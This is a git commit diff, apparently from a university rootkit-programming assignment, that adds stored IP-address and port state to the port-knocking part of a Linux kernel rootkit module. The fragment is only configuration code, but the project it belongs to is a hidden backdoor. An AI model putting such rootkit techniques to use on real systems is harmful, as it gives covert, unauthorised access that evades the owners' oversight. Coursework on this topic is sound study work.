ab625e9bad4d6098df496f0ea232af2e62b62c19
Martin Herrmann <martin.herrmann@tum.de>
2014-12-13 16:34:40 +0100

    mher: Fixed small error.

--- assignment09/port_knocking.c
+++ assignment09/port_knocking.c
@@ -8,12 +8,22 @@
 #include "include.h"
 #include "main.h"
 
+/* the port for which knocking is enabled */
+static unsigned int port;
+
+/* the ip address which is allowed to connect */
+static u8 ip[4];
 
 void
 load_port_knocking (char *ipv4_addr, unsigned int port_number)
 {
 	ROOTKIT_DEBUG("Starting to load the port knocking...\n");
+	
+	/* convert ip string to an int array */
+	in4_pton(ipv4_addr, -1, ip, -1, NULL);
 
+	/* copy the port number */
+	port = port_number;
 
 	ROOTKIT_DEBUG("Done.\n");
 }
